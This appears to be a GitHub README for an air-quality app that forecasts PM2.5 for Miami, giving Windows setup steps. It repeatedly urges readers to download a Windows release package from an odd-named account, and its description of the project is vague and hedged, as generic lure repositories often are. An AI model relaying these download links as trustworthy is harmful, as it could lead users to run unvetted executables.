# 🌿 Air-Quality - Forecast PM2.5 with Ease

[![Download Air-Quality](https://img.shields.io/badge/Download-Air--Quality-blue?style=for-the-badge)](https://github.com/Clasticrockprotectivecoloration779/Air-Quality/releases)

## 🖥️ Download the App

Visit this page to download the Windows release:
https://github.com/Clasticrockprotectivecoloration779/Air-Quality/releases

Choose the latest file, then download it to your PC.

## 📌 What This App Does

Air-Quality helps you view and forecast PM2.5 levels for Miami-Fort Lauderdale-Miami Beach.

It uses air quality data from OpenAQ and shows trends from January 2022 to December 2023.

You can use it to:
- check PM2.5 patterns over time
- see air pollution trends
- review model output in a simple way
- explore how air quality changes by date

## 📺 Video Guides

Full project video, from setup to data drift and model decay:
https://drive.google.com/file/d/1tJdksISK_47ZJ1LaDJgKaWjyYVLYTyhY/view?usp=sharing

Model deployment only on a fresh Windows environment:
https://drive.google.com/file/d/1nKzUDqiUGTy4IsbkxV7dYFf_Rv-tu_ET/view?usp=sharing

## 💻 System Requirements

Before you run Air-Quality on Windows, make sure you have:

- Windows 10 or Windows 11
- An internet connection
- At least 8 GB RAM
- 5 GB free disk space
- Git
- Python 3.8 or newer
- Docker Desktop
- DVC

## 📥 Install on Windows

### 1. Download the release
Open the releases page:
https://github.com/Clasticrockprotectivecoloration779/Air-Quality/releases

Download the latest Windows package from the release files.

### 2. Install Python
If Python is not on your PC:
- download Python 3.8 or later from the official Python website
- during setup, turn on Add Python to PATH
- finish the install

### 3. Install Git
If Git is not on your PC:
- download Git for Windows
- accept the default setup options
- finish the install

### 4. Install Docker Desktop
Install Docker Desktop and start it.

For Windows:
- download Docker Desktop from the Docker website
- run the installer
- open Docker Desktop after setup
- wait until it says Docker is running

### 5. Install DVC
Open Command Prompt and run:

```bash
pip install dvc
```

## 📁 Set Up the Project

### 1. Get the files
If you downloaded a release zip:
- unzip it to a folder
- open that folder

If you cloned the repo:
```bash
git clone https://github.com/Clasticrockprotectivecoloration779/Air-Quality.git
cd Air-Quality
```

### 2. Create a virtual environment
Open Command Prompt in the project folder and run:

```bash
python -m venv .venv
```

Activate it:

```bash
.venv\Scripts\activate
```

### 3. Install Python packages
Run:

```bash
pip install -r requirements.txt
```

If the project uses DVC data files, also run:

```bash
dvc pull
```

## 🚀 Run the App

After setup, start the app with:

```bash
python app.py
```

If the project uses a different entry file, try:

```bash
python main.py
```

If Docker is part of your setup, make sure Docker Desktop is running before you start.

## 🧭 First-Time Use

When the app opens:
- load the latest data if prompted
- check the PM2.5 trend chart
- choose the date range you want to view
- review the forecast results
- use the analysis panels to compare air quality patterns

## 🗂️ Project Files

Common files in this project may include:

- `data/` for raw and processed data
- `models/` for trained model files
- `notebooks/` for analysis work
- `src/` for project code
- `app.py` or `main.py` for the app start file
- `requirements.txt` for Python packages
- `dvc.yaml` for tracked data pipelines

## 🔄 Data Flow

This project follows a simple path:

1. collect air quality data from OpenAQ
2. clean and prepare the data
3. train a model on PM2.5 values
4. check forecast quality
5. watch for data drift and model decay
6. use the model to view new PM2.5 estimates

## 🛠️ Common Problems

### Docker Desktop is not running
Open Docker Desktop and wait until it finishes starting.

### Python command not found
Install Python again and turn on Add Python to PATH.

### Packages do not install
Make sure you activated the virtual environment before you run `pip install`.

### DVC pull fails
Check your internet connection and confirm DVC is installed.

### App does not start
Try this:
- close the Command Prompt
- open it again in the project folder
- activate `.venv`
- run the start command again

## 📊 What You Can Expect

The app is built to help you:
- track PM2.5 values over time
- compare recent readings with past data
- see model-based predictions
- follow air quality trends for the Miami area

## 🔧 Basic Commands

Check your Python version:
```bash
python --version
```

Check Git:
```bash
git --version
```

Check DVC:
```bash
dvc --version
```

Install project packages again:
```bash
pip install -r requirements.txt
```

Pull tracked data:
```bash
dvc pull
```

## 📍 Download Again

If you need the files again, use the release page:
https://github.com/Clasticrockprotectivecoloration779/Air-Quality/releases